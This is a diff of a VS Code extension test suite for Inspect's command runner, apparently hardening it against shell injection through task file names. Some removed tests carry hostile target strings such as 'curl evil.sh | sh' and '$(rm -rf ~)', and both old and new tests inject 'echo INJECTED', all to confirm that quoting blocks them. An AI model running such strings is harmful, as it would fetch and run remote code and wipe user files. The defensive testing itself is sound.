@@ -3,16 +3,8 @@
  */
 import * as assert from "assert";
 
-import { Terminal, window } from "vscode";
-
-import {
-  buildRunCommand,
-  ExecProfile,
-  runCommand,
-  terminalShellKind,
-} from "../../core/package/exec-manager";
+import { ExecProfile } from "../../core/package/exec-manager";
 import { AbsolutePath } from "../../core/path";
-import { quoteCommandLine } from "../../core/shell-quote";
 import { DocumentState } from "../../providers/workspace/workspace-state-provider";
 
 /**
@@ -413,94 +405,6 @@ suite("ExecManager Test Suite", () => {
     });
   });
 
-  suite("buildRunCommand (real command construction)", () => {
-    const profile = (overrides: Partial<ExecProfile> = {}): ExecProfile => ({
-      packageName: "inspect-ai",
-      packageDisplayName: "Inspect",
-      packageVersion: createMockVersion(
-        "0.4.0"
-      ) as unknown as ExecProfile["packageVersion"],
-      target: "Eval",
-      terminal: "Inspect Eval",
-      command: "inspect",
-      subcommand: "eval",
-      binPath: null,
-      execArgs: () => [],
-      ...overrides,
-    });
-
-    test("uses the bare command when no python path is given", () => {
-      const { command, args } = buildRunCommand(profile(), [
-        "eval",
-        "task.py@my_task",
-      ]);
-
-      assert.strictEqual(command, "inspect");
-      assert.deepStrictEqual(args, ["eval", "task.py@my_task"]);
-    });
-
-    test("uses `python -m <package>` when a python path is given", () => {
-      const python = { path: "/venv/bin/python" } as AbsolutePath;
-      const { command, args } = buildRunCommand(
-        profile(),
-        ["eval", "task.py@my_task"],
-        python
-      );
-
-      assert.strictEqual(command, "/venv/bin/python");
-      assert.deepStrictEqual(args, [
-        "-m",
-        "inspect-ai",
-        "eval",
-        "task.py@my_task",
-      ]);
-    });
-
-    test("uses the scout package name when running under python", () => {
-      const python = { path: "/venv/bin/python" } as AbsolutePath;
-      const { command, args } = buildRunCommand(
-        profile({ packageName: "inspect-scout", command: "scout" }),
-        ["scan", "scan.py"],
-        python
-      );
-
-      assert.strictEqual(command, "/venv/bin/python");
-      assert.deepStrictEqual(args, ["-m", "inspect-scout", "scan", "scan.py"]);
-    });
-
-    test("keeps a space-bearing target as a single argument", () => {
-      const { args } = buildRunCommand(profile(), [
-        "eval",
-        "src/my tasks/task file.py@evaluate_model",
-      ]);
-
-      // The space-bearing target must remain ONE argument, not be split — it is
-      // the caller's job to quote it before sending it to a shell.
-      assert.deepStrictEqual(args, [
-        "eval",
-        "src/my tasks/task file.py@evaluate_model",
-      ]);
-    });
-
-    test("passes file/task names through verbatim (caller quotes)", () => {
-      const hostile = "task.py; curl evil.sh | sh@$(rm -rf ~)";
-      const { args } = buildRunCommand(profile(), ["eval", hostile]);
-
-      assert.deepStrictEqual(args, ["eval", hostile]);
-    });
-
-    test("renders a fully-quoted command line for a hostile target", () => {
-      // End-to-end: the program + args, once quoted for the shell, must carry
-      // the hostile target as a single literal token rather than executing it.
-      const hostile = "task.py; curl evil.sh | sh";
-      const { command, args } = buildRunCommand(profile(), ["eval", hostile]);
-      const line = quoteCommandLine([command, ...args], "posix");
-
-      // "inspect" and "eval" are safe bare; the hostile target gets quoted.
-      assert.strictEqual(line, `inspect eval '${hostile}'`);
-    });
-  });
-
   suite("Package Version Validation", () => {
     test("should detect when package is not installed", () => {
       const packageVersion = null;
@@ -526,153 +430,92 @@ suite("ExecManager Test Suite", () => {
   });
 });
 
-suite("Terminal shell detection", () => {
-  const terminal = (shellPath?: string, shell?: string) =>
-    ({
-      creationOptions: shellPath ? { shellPath } : {},
-      state: { isInteractedWith: false, shell },
-    }) as Pick<Terminal, "creationOptions" | "state">;
-
-  test("refuses reuse without reported identity, regardless of creation path", () => {
-    // VS Code 1.93 exposes no state.shell. Defaults may have changed from fish
-    // to bash, or the user may have entered a nested shell since creation.
-    assert.strictEqual(terminalShellKind(terminal()), undefined);
-    assert.strictEqual(terminalShellKind(terminal("/bin/fish")), undefined);
-    assert.strictEqual(terminalShellKind(terminal("/bin/bash")), undefined);
-  });
-
-  test("uses the captured resolved executable only for a new terminal", () => {
-    assert.strictEqual(terminalShellKind(terminal(), "/bin/fish"), "fish");
-    assert.strictEqual(terminalShellKind(terminal(), "/bin/bash"), "posix");
-    assert.strictEqual(terminalShellKind(terminal(), "/bin/nu"), undefined);
-    assert.strictEqual(terminalShellKind(terminal(), ""), undefined);
-    assert.strictEqual(
-      terminalShellKind(terminal("/bin/nu"), "/bin/bash"),
-      undefined
-    );
-  });
-
-  test("uses reported shell before creation or launch settings", () => {
-    assert.strictEqual(
-      terminalShellKind(terminal("/bin/bash", "fish"), "/bin/bash"),
-      "fish"
-    );
-    assert.strictEqual(
-      terminalShellKind(terminal("/bin/fish", "bash"), "/bin/fish"),
-      "posix"
-    );
-    assert.strictEqual(
-      terminalShellKind(terminal("/bin/bash", "nu"), "/bin/bash"),
-      undefined
-    );
-  });
-
-  test("recognizes the reported Git Bash identifier", () => {
-    assert.strictEqual(
-      terminalShellKind(
-        terminal("C:\\Program Files\\Git\\bin\\bash.exe", "gitbash")
-      ),
-      "posix"
-    );
-    assert.strictEqual(
-      terminalShellKind(terminal(undefined, "gitbash")),
-      "posix"
-    );
-  });
-
-  test("unknown reported grammars cannot fall back to Windows or POSIX quoting", () => {
-    for (const shell of [
-      "wsl",
-      "nu",
-      "csh",
-      "python",
-      "node",
-      "xonsh",
-      "custom",
-    ]) {
-      assert.strictEqual(
-        terminalShellKind(
-          terminal(undefined, shell),
-          "C:\\Windows\\System32\\cmd.exe"
-        ),
-        undefined
+suite("Run on hosts without shell identity", () => {
+  test("first and repeated Run emit only the fixed transport in both integration modes", async function () {
+    this.timeout(20000);
+    const vscode = await import("vscode");
+    const { runCommand } = await import("../../core/package/exec-manager");
+    const originals = new Map<string, PropertyDescriptor>();
+    const replace = (name: string, value: unknown) => {
+      originals.set(
+        name,
+        Object.getOwnPropertyDescriptor(vscode.window, name)!
       );
-      assert.strictEqual(
-        terminalShellKind(terminal(undefined, shell), "/bin/bash"),
-        undefined
-      );
-    }
-  });
-});
-
-suite("Run command shell refusal", () => {
-  test("never emits commands to reused terminals without a known reported grammar", async () => {
-    const terminalsDescriptor = Object.getOwnPropertyDescriptor(
-      window,
-      "terminals"
-    )!;
-    const errorDescriptor = Object.getOwnPropertyDescriptor(
-      window,
-      "showErrorMessage"
-    )!;
+      Object.defineProperty(vscode.window, name, { configurable: true, value });
+    };
     const emitted: string[] = [];
-    const errors: string[] = [];
-    const profile: ExecProfile = {
+    const disposables: { dispose: () => void }[] = [];
+    const terminal = {
+      name: "Inspect Eval",
+      // Exactly the identity available on the supported VS Code 1.93 host.
+      state: { isInteractedWith: false },
+      creationOptions: {
+        shellPath: "/bin/bash",
+        shellArgs: ["-c", "exec fish"],
+      },
+      shellIntegration: undefined as
+        undefined | { executeCommand: (line: string) => void },
+      show: () => {},
+      sendText: (line: string) => emitted.push(line),
+    };
+    const profile = {
       packageName: "inspect-ai",
-      packageDisplayName: "Inspect",
-      packageVersion: null,
+      command: "inspect",
       target: "Eval",
       terminal: "Inspect Eval",
-      command: "inspect",
-      subcommand: "eval",
-      binPath: null,
-      execArgs: () => [],
-    };
+    } as ExecProfile;
     try {
-      Object.defineProperty(window, "showErrorMessage", {
-        configurable: true,
-        value: (message: string) => {
-          errors.push(message);
-          return Promise.resolve(undefined);
-        },
-      });
-      for (const shell of [undefined, "nu", "wsl"]) {
-        const terminal = {
-          name: "Inspect Eval",
-          creationOptions: { shellPath: "/bin/bash" },
-          state: { isInteractedWith: true, shell },
-          show: () => {},
-          shellIntegration: {
-            executeCommand: (line: string) => {
-              emitted.push(line);
-            },
-          },
-          sendText: (line: string) => {
-            emitted.push(line);
-          },
-        };
-        Object.defineProperty(window, "terminals", {
-          configurable: true,
-          value: [terminal],
-        });
-        await runCommand(
-          profile,
-          [
-            "eval",
-            "t\\';echo INJECTED;#'.py@demo",
-            "-T",
-            "a=\\",
-            "-T",
-            "b=;echo INJECTED;#",
-          ],
-          "/workspace"
-        );
+      replace("onDidCloseTerminal", () => ({ dispose: () => {} }));
+      replace("createTerminal", () => terminal);
+      replace("terminals", []);
+      // Exercise the no-integration callback without waiting 10 seconds per test.
+      replace(
+        "onDidChangeTerminalShellIntegration",
+        (callback: (e: unknown) => void) => {
+          queueMicrotask(() =>
+            callback({ terminal, shellIntegration: undefined })
+          );
+          return { dispose: () => {} };
+        }
+      );
+      for (const integration of [true, false]) {
+        terminal.shellIntegration = integration
+          ? {
+              executeCommand: (line: string) => {
+                emitted.push(line);
+              },
+            }
+          : undefined;
+        for (const reused of [false, true]) {
+          Object.defineProperty(vscode.window, "terminals", {
+            configurable: true,
+            value: reused ? [terminal] : [],
+          });
+          disposables.push(
+            await runCommand(
+              profile,
+              ["eval", "t\\';echo INJECTED;#'.py@demo"],
+              "/cwd [literal]",
+              { path: "/selected/python" } as AbsolutePath
+            )
+          );
+        }
       }
-      assert.deepStrictEqual(emitted, []);
-      assert.strictEqual(errors.length, 3);
+      assert.strictEqual(emitted.length, 4);
+      for (const line of emitted) {
+        assert.match(line, /^python3? -I -c "/);
+        assert.ok(!line.includes("INJECTED"));
+        assert.ok(!line.includes("/cwd"));
+        assert.ok(!line.includes("/selected/python"));
+        assert.ok(!line.startsWith("cd "));
+      }
     } finally {
-      Object.defineProperty(window, "terminals", terminalsDescriptor);
-      Object.defineProperty(window, "showErrorMessage", errorDescriptor);
+      for (const disposable of disposables) {
+        disposable.dispose();
+      }
+      for (const [name, descriptor] of originals) {
+        Object.defineProperty(vscode.window, name, descriptor);
+      }
     }
   });
 });
